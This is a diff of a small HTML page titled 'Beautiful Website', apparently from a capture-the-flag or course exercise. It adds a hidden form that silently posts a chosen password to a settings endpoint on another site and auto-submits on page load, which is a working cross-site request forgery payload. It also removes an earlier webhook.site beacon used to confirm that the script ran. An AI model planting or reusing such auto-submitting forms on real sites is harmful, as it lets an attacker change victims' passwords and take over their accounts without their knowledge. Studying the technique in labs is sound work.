@@ -1,16 +1,28 @@
 
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8">
   <title>Beautiful Website</title>
 </head>
 <body>
-  <h1>Hello world!</h1>
+  <h1>Welcome!</h1>
+
+  <form id="csrf"
+        action="https://cats.is-course.ru/settings"
+        method="POST">
+
+    <input type="hidden"
+           name="password"
+           value="MyCTFpass2026!">
+
+    <input type="hidden"
+           name="confirm-password"
+           value="MyCTFpass2026!">
+  </form>
 
   <script>
-    new Image().src =
-      "https://webhook.site/e8e375be-89bc-46ea-809c-d703307be927?js=executed";
+    document.getElementById("csrf").submit();
   </script>
 </body>
 </html>
